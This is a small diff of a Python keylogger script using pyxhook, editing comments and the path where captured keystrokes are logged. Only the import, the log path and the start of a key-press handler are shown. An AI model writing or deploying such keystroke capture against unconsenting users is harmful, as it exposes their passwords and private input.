@@ -1,9 +1,10 @@
 import pyxhook
 
-#this tells the keylogger where the log will go. Change it to direct to where you want it.
+#This tells the keylogger where the log will go. Change it to direct to where you want it.
 
-log_file='/home/giacomo/Desktop/file.log'
+log_file='/home/Giacomo/Desktop/file.log'
 
+#The file will automatically appear on the desktop. You may want to edit the location!
 
 def OnKeyPress(event):
 
